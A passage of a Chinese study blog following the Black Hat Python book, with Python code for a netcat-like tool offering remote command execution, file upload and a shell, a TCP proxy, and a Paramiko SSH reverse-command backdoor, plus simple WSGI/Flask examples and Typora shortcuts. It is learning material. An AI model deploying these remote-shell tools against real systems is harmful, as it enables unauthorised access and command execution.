class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取所有的字符并写下目标</span></span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 持续读取数据直到没有符合的数据</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination,<span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            client_socket.send(<span class="string">"Successfully saved file to %s\r\n"</span> % upload_destination)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">"Failed to save file to %s\r\n"</span> % upload_destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket.send(<span class="string">b"&lt;BHP:#&gt; "</span>)</span><br><span class="line"></span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">                response = run_command(cmd_buffer)</span><br><span class="line"></span><br><span class="line">                client_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]): <span class="comment">#获取参数</span></span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hle:t:p:cu:"</span>, [<span class="string">"help"</span>,<span class="string">"listen"</span>,<span class="string">"execute"</span>,<span class="string">"target"</span>,<span class="string">"port"</span>,<span class="string">"command"</span>,<span class="string">"upload"</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        print(str(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>,<span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--commandshell"</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">"Unhandled Option"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#监听还是仅从标准输入发送数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#从命令行读取内存数据</span></span><br><span class="line">        <span class="comment"># 这里将阻塞， 所以不再向标准输入发送数据时发送CTRL-D</span></span><br><span class="line">        buffer = sys.stdin.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始监听并准备上传文件、执行命令</span></span><br><span class="line">    <span class="comment"># 放置一个反弹shell</span></span><br><span class="line">    <span class="comment"># 取决于上面的命令行选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h4 id="5-TCP代理"><a href="#5-TCP代理" class="headerlink" title="5.TCP代理"></a><strong>5.TCP代理</strong></h4><p>TCP代理的过程大致如下：</p>
<p>1.服务端开始监听服务端的本机端口，等待来自于代理方的socket连接；</p>
<p>2.代理方监听本机端口，等待来自客户端的socket连接；</p>
<p>3.客户端创建socket与代理方进行连接；</p>
<p>4.代理方收到来自客户端的链接后，创建一个socket与服务端进行连接；</p>
<p>5.服务端收到来自代理端的连接；</p>
<p>链接建立后，通信过程如下：</p>
<p>1.客户端发送请求给代理方；</p>
<p>2.代理方对请求进行处理，将处理后的请求发送给服务端；</p>
<p>3.服务端接收请求后，根据请求信息发送回复给代理方；</p>
<p>4.代理方将收到的回复信息进行处理，将处理后的信息发送给客户端；</p>
<p><strong>写程序过程中踩了几个坑，这里注意下，接收的数据是二进制流b’’ ，应该转化为str再进行16进制编码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">(local_host,local_port,remote_host,remote_port,receive_first)</span>:</span></span><br><span class="line">    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host,local_port))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"failed"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">"listening on %s:%d"</span> %(local_host,local_port))</span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket,addr=server.accept()</span><br><span class="line">        <span class="comment">#打印出本地连接信息</span></span><br><span class="line">        print(<span class="string">"=====&gt; Received incoming connection from %s:%d"</span>% (addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment">#开启一个线程与远程主机通信</span></span><br><span class="line">        proxy_thread=threading.Thread(target=proxy_handler,args=(client_socket,remote_host,remote_port,receive_first))</span><br><span class="line">        proxy_thread.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_handler</span><span class="params">(client_socket,remote_host,remote_port,receive_first)</span>:</span></span><br><span class="line">    <span class="comment">#连接远程主机</span></span><br><span class="line">    remote_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    remote_socket.connect((remote_host,remote_port))</span><br><span class="line">    <span class="comment">#如果必要从远程主机接收数据</span></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer=receive_from(remote_socket)</span><br><span class="line">        hexdump(remote_buffer)</span><br><span class="line">        <span class="comment">#发送给我们的响应处理</span></span><br><span class="line">        remote_buffer=response_handler(remote_buffer)</span><br><span class="line">        <span class="comment">#如果我们有数据传递给本地客户端，发送它</span></span><br><span class="line">        <span class="keyword">if</span> len(remote_buffer):</span><br><span class="line">            print(<span class="string">"&lt;=== Sending %d bytes to localhost."</span> %len(remote_buffer))</span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">        <span class="comment">#现在我们从本地循环读取数据，发送给远程主机和本地主机</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#从本地读取数据</span></span><br><span class="line">            local_buffer=receive_from(client_socket)</span><br><span class="line">            <span class="keyword">if</span> len(local_buffer):</span><br><span class="line">                print(<span class="string">"==&gt; Received %d bytes from localhost."</span> %len(local_buffer))</span><br><span class="line">                hexdump(local_buffer)</span><br><span class="line">                <span class="comment">#发送给我们的本地请求</span></span><br><span class="line">                local_buffer=request_handler(local_buffer)</span><br><span class="line">                <span class="comment">#向远程主机发送数据</span></span><br><span class="line">                remote_socket.send(local_buffer)</span><br><span class="line">                print(<span class="string">"==&gt; sent to remote."</span>)</span><br><span class="line">            <span class="comment">#接收响应的数据</span></span><br><span class="line">            remote_buffer=receive_from(remote_socket)</span><br><span class="line">            <span class="keyword">if</span> len(remote_buffer):</span><br><span class="line">                print(<span class="string">"&lt;== receive %d bytes from remote."</span> % len(remote_buffer))</span><br><span class="line">                hexdump(remote_buffer)</span><br><span class="line">                <span class="comment">#发送到响应处理函数</span></span><br><span class="line">                remote_buffer=response_handler(remote_buffer)</span><br><span class="line">                <span class="comment">#将响应发送给本地socket</span></span><br><span class="line">                client_socket.send(remote_buffer)</span><br><span class="line">                print(<span class="string">"&lt;=== sent to localhost."</span>)</span><br><span class="line">            <span class="comment">#如果两边都没有数据，关闭连接</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(local_buffer) <span class="keyword">or</span> <span class="keyword">not</span> len(remote_buffer):</span><br><span class="line">                client_socket.close()</span><br><span class="line">                remote_socket.close()</span><br><span class="line">                print(<span class="string">"No more data. Closing connections."</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span><span class="params">(src, length = <span class="number">16</span>)</span>:</span></span><br><span class="line">    src=src.decode()</span><br><span class="line">    result = []</span><br><span class="line">    digits = <span class="number">2</span> <span class="keyword">if</span> isinstance(src, str) <span class="keyword">else</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(src), length):</span><br><span class="line">        s = src[i:i+length]</span><br><span class="line">        hexa = <span class="string">' '</span>.join([<span class="string">'%0*X'</span> % (digits, ord(x)) <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        text = <span class="string">''</span>.join([x <span class="keyword">if</span> <span class="number">0x20</span> &lt;= ord(x) &lt; <span class="number">0x7F</span> <span class="keyword">else</span> <span class="string">'.'</span> <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        result.append(<span class="string">'%04X  %-*s   %s'</span> % (i, length*(digits + <span class="number">1</span>), hexa, text))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        print(i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_from</span><span class="params">(connection)</span>:</span></span><br><span class="line">    str=<span class="string">b''</span></span><br><span class="line">    connection.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=connection.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            str+=data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_handler</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response_handler</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv[<span class="number">1</span>:])!=<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">"Usage: ./proxy 127.0.0.1 9000 10.12.132.1 9000 True 参数要对"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#设置本地监听参数</span></span><br><span class="line">    local_host=sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="comment">#设置远程目标</span></span><br><span class="line">    remote_host=sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port=int(sys.argv[<span class="number">4</span>])</span><br><span class="line">    <span class="comment">#告诉代理在发送给远程主机</span></span><br><span class="line">    receive_first=sys.argv[<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"True"</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first=<span class="literal">False</span></span><br><span class="line">    <span class="comment">#设置好监听socket</span></span><br><span class="line">    server_loop(local_host,local_port,remote_host,remote_port,receive_first)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h3 id="6-通过Paramiko使用SSH"><a href="#6-通过Paramiko使用SSH" class="headerlink" title="6.通过Paramiko使用SSH"></a><strong>6.通过Paramiko使用SSH</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -m PEM -f &#x2F;etc&#x2F;ssh&#x2F;test_rsa_key</span><br><span class="line">ssh-keygen -t rsa -f &#x2F;etc&#x2F;ssh&#x2F;test_rsa_key</span><br></pre></td></tr></table></figure>





<p>创建SSH客户端</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Paramiko示例文件的密钥</span></span><br><span class="line"><span class="comment">#host_key = paramiko.RSAKey(filename='test_rsa.key')</span></span><br><span class="line">host_key = paramiko.RSAKey(filename=<span class="string">'/etc/ssh/test2_rsa_key'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span><span class="params">(paramiko.ServerInterface)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.event = threading.Event()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_channel_request</span><span class="params">(self, kind, chanid)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="string">'session'</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.OPEN_SUCCEEDED</span><br><span class="line">        <span class="keyword">return</span> paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_auth_password</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="string">'orld'</span>) <span class="keyword">and</span> (password == <span class="string">'orld'</span>):</span><br><span class="line">            <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line">        <span class="keyword">return</span> paramiko.AUTH_FAILED</span><br><span class="line"></span><br><span class="line">server = sys.argv[<span class="number">1</span>]</span><br><span class="line">ssh_port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    <span class="comment">#TCP socket</span></span><br><span class="line">    <span class="comment">#这里value设置为1，表示将SO_REUSEADDR标记为TRUE，操作系统会在服务器socket被关闭或服务器进程终止后马上释放该服务器的端口，否则操作系统会保留几分钟该端口。</span></span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.bind((server, ssh_port))   <span class="comment">#绑定ip和端口</span></span><br><span class="line">    sock.listen(<span class="number">100</span>)    <span class="comment">#最大连接数为100</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[+] Listening for connection ...'</span>)                                                                                                                                                      </span><br><span class="line">    client, addr = sock.accept()                                                                                                                                                                    </span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[-] Listen failed: '</span> )</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'[+] Got a connection!'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    bhSession = paramiko.Transport(client)</span><br><span class="line">    bhSession.add_server_key(host_key)</span><br><span class="line">    server = Server()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bhSession.start_server(server=server)</span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[-] SSH negotiation failed'</span>)</span><br><span class="line">    chan = bhSession.accept(<span class="number">20</span>) <span class="comment">#设置超时值为20</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[+] Authenticated!'</span>)</span><br><span class="line">    <span class="keyword">print</span> (chan.recv(<span class="number">1024</span>).decode())</span><br><span class="line">    chan.send(<span class="string">'Welcome to bh_ssh'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = input(<span class="string">"Enter command:"</span>).strip(<span class="string">"\n"</span>)   <span class="comment">#strip移除字符串头尾指定的字符（默认为空格）,这里是换行</span></span><br><span class="line">            <span class="keyword">if</span> command != <span class="string">'exit'</span>:</span><br><span class="line">                chan.send(command)</span><br><span class="line">                print(command)</span><br><span class="line">                print(<span class="string">"okkkk"</span>)</span><br><span class="line">                <span class="keyword">print</span> (chan.recv(<span class="number">1024</span>).decode())</span><br><span class="line">                print(<span class="string">"1233333"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                chan.send(<span class="string">'exit'</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'exiting'</span>)</span><br><span class="line">                bhSession.close()</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">'exit'</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            bhSession.close()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[-] Caught exception: '</span> )</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bhSession.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span><span class="params">(ip, user, passwd, command,port)</span>:</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    <span class="comment"># client.load_host_keys('/home/root/.ssh/known_hosts') #支持用密钥认证代替密码验证,实际环境推荐使用密钥认证</span></span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    <span class="comment">#设置自动添加和保存目标ssh服务器的ssh密钥</span></span><br><span class="line">    client.connect(ip, port=<span class="number">80</span>,username=user, password=passwd)  <span class="comment">#连接</span></span><br><span class="line">    ssh_session = client.get_transport().open_session() <span class="comment">#打开会话</span></span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.send(command)   <span class="comment">#发送command这个字符串，并不是执行命令</span></span><br><span class="line">        <span class="keyword">print</span> (ssh_session.recv(<span class="number">1024</span>).decode())   <span class="comment">#返回命令执行结果(1024个字符)</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            c = ssh_session.recv(<span class="number">1024</span>).decode() </span><br><span class="line">            <span class="comment">#print(c)#从ssh服务器获取命令</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(c)</span><br><span class="line">                cmd_output = subprocess.check_output(c, shell=<span class="literal">True</span>)</span><br><span class="line">               <span class="comment">#print(cmd_output.decode())</span></span><br><span class="line">                ssh_session.send(cmd_output)</span><br><span class="line">            <span class="keyword">except</span> :</span><br><span class="line">                ssh_session.send(<span class="string">'wrong'</span>)</span><br><span class="line">        client.close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">ssh_command(<span class="string">'127.0.0.1'</span>, <span class="string">'orld'</span>, <span class="string">'orld'</span>, <span class="string">'ClientConnected'</span>,<span class="string">'80'</span>)</span><br></pre></td></tr></table></figure>



<h3 id="7-SSH隧道"><a href="#7-SSH隧道" class="headerlink" title="7.SSH隧道"></a><strong>7.SSH隧道</strong></h3><h3 id="Web攻击"><a href="#Web攻击" class="headerlink" title="Web攻击"></a>Web攻击</h3><h4 id="1-web开发相关知识"><a href="#1-web开发相关知识" class="headerlink" title="1.web开发相关知识"></a>1.web开发相关知识</h4><p>Web应用的本质就是：</p>
<ol>
<li>浏览器发送一个HTTP请求；</li>
<li>服务器收到请求，生成一个HTML文档；</li>
<li>服务器把HTML文档作为HTTP响应的Body发送给浏览器；</li>
<li>浏览器收到HTTP响应，从HTTP Body取出HTML文档并显示。</li>
</ol>
<p>所以，最简单的Web应用就是先把HTML用文件保存好，用一个现成的HTTP服务器软件，接收用户请求，从文件中读取HTML，返回。Apache、Nginx、Lighttpd等这些常见的静态服务器就是干这件事情的。</p>
<p>如果要动态生成HTML，就需要把上述步骤自己来实现。不过，接受HTTP请求、解析HTTP请求、发送HTTP响应都是苦力活，如果我们自己来写这些底层代码，还没开始写动态HTML呢，就得花个把月去读HTTP规范。</p>
<p>正确的做法是底层代码由专门的服务器软件实现，我们用Python专注于生成HTML文档。因为我们不希望接触到TCP连接、HTTP原始请求和响应格式，所以，需要一个统一的接口，让我们专心用Python编写Web业务。</p>
<p>这个接口就是WSGI：Web Server Gateway Interface。</p>
<p>WSGI接口定义非常简单，它只要求Web开发者实现一个函数，就可以响应HTTP请求。我们来看一个最简单的Web版本的“Hello, web!”：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="comment">#environ 一个包含所有HTTP请求信息的dict对象</span></span><br><span class="line"><span class="comment">#star_response 一个发送HTTP响应的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    <span class="comment">#header只能发送一次，即只能调用一次star_response</span></span><br><span class="line">    <span class="comment">#start_response接收2个参数，一个是http响应码，一个是一组list，表示header</span></span><br><span class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/html'</span>)])</span><br><span class="line">    body = <span class="string">'&lt;h1&gt;Hello, %s!&lt;/h1&gt;'</span> % (environ[<span class="string">'PATH_INFO'</span>][<span class="number">1</span>:] <span class="keyword">or</span> <span class="string">'web'</span>) <span class="comment">#localhost../chj 动态输出</span></span><br><span class="line">    <span class="comment">#body = '&lt;h1&gt;hello, &#123;&#125;&lt;/h1&gt;'.format((environ['PATH_INFO'][1:] or 'wsgi'))</span></span><br><span class="line">    print(body)</span><br><span class="line">    <span class="keyword">return</span> [body.encode(<span class="string">'utf-8'</span>)]</span><br><span class="line"></span><br><span class="line">httpd = make_server(<span class="string">''</span>, <span class="number">8000</span>, application)</span><br><span class="line">print(<span class="string">'Serving HTTP on port 8000...'</span>)</span><br><span class="line">httpd.serve_forever() <span class="comment">#开始监听HTTP请求</span></span><br></pre></td></tr></table></figure>

<p>小结：无论多么复杂的Web应用程序，入口都是一个WSGI处理函数。HTTP请求的所有输入信息都可以通过<code>environ</code>获得，HTTP响应的输出都可以通过<code>start_response()</code>加上函数返回值作为Body。</p>
<p>复杂的Web应用程序，光靠一个WSGI函数来处理还是太底层了，我们需要在WSGI之上再抽象出Web框架，进一步简化Web开发。</p>
<p>除了Flask，常见的Python Web框架还有：</p>
<ul>
<li><a href="https://www.djangoproject.com/" target="_blank" rel="noopener">Django</a>：全能型Web框架；</li>
<li><a href="http://webpy.org/" target="_blank" rel="noopener">web.py</a>：一个小巧的Web框架；</li>
<li><a href="http://bottlepy.org/" target="_blank" rel="noopener">Bottle</a>：和Flask类似的Web框架；</li>
<li><a href="http://www.tornadoweb.org/" target="_blank" rel="noopener">Tornado</a>：Facebook的开源异步Web框架。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Home&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/signin', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin_form</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;form action="/signin" method="post"&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;input name="username"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;input name="password" type="password"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;button type="submit"&gt;Sign In&lt;/button&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;/form&gt;'''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/signin', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 需要从request对象读取表单内容：</span></span><br><span class="line">    <span class="keyword">if</span> request.form[<span class="string">'username'</span>]==<span class="string">'admin'</span> <span class="keyword">and</span> request.form[<span class="string">'password'</span>]==<span class="string">'password'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;h3&gt;Hello, admin!&lt;/h3&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h3&gt;Bad username or password.&lt;/h3&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>













<h4 id="2-urllib2-库"><a href="#2-urllib2-库" class="headerlink" title="2.urllib2 库"></a>2.urllib2 库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">body &#x3D; urllib2.urlopen(&quot;http:&#x2F;&#x2F;www.nostarch.com&quot;)</span><br><span class="line">print body.read()</span><br></pre></td></tr></table></figure>





<h3 id="typora软件的windows快捷键"><a href="#typora软件的windows快捷键" class="headerlink" title="typora软件的windows快捷键"></a>typora软件的windows快捷键</h3><h4 id="文件类"><a href="#文件类" class="headerlink" title="文件类"></a>文件类</h4><ul>
<li>新建文件： <code>ctrl</code> + <code>N</code></li>
<li>新建窗口： <code>ctrl</code> + <code>shift</code> + <code>N</code></li>
<li>打开： <code>ctrl</code> + <code>O</code></li>
<li>快速打开： <code>ctrl</code> + <code>P</code></li>
<li>保存： <code>ctrl</code> + <code>S</code></li>
<li>另存为： <code>ctrl</code> + <code>shift</code> + <code>S</code></li>
<li>关闭： <code>ctrl</code> + <code>W</code></li>
</ul>
<h4 id="编辑类"><a href="#编辑类" class="headerlink" title="编辑类"></a>编辑类</h4><ul>
